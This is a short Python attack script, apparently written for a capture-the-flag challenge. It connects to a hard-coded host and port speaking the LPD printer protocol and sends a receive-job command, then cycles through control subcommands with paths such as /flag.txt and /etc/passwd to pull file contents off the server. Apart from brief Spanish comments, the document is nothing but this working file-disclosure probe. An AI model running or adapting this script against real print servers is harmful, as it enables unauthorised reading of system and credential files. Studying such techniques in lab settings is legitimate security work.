#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

def test_subcommand(subcmd, filename):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        
        # Primero enviar receive job
        s.sendall(b'\x02lp\n')
        time.sleep(0.2)
        s.recv(1024)
        
        # Luego enviar subcomando
        data = bytes([subcmd]) + b'100 ' + filename.encode() + b'\n'
        s.sendall(data)
        time.sleep(0.3)
        
        resp = b''
        s.settimeout(2)
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        
        s.close()
        return resp
    except Exception as e:
        return b''

# Probar todos los subcomandos posibles
print("=== Testing subcomandos (0x01-0x09) con /flag.txt ===\n")
for subcmd in range(1, 10):
    resp = test_subcommand(subcmd, "/flag.txt")
    if len(resp) > 1:
        print(f"Subcomando 0x{subcmd:02x}: {len(resp)} bytes")
        print(f"  Hex: {resp[:100].hex()}")
        try:
            text = resp.decode('utf-8', errors='replace')
            print(f"  Text: {text[:200]}")
        except:
            pass
        print()

# Probar subcomando 0x04 (no estándar)
print("\n=== Subcomando 0x04 con diferentes archivos ===\n")
for filename in ["/flag.txt", "/etc/passwd", "flag.txt", "/flag"]:
    resp = test_subcommand(0x04, filename)
    if len(resp) > 1:
        print(f"File '{filename}': {len(resp)} bytes")
        print(f"  Text: {resp.decode('utf-8', errors='replace')[:200]}")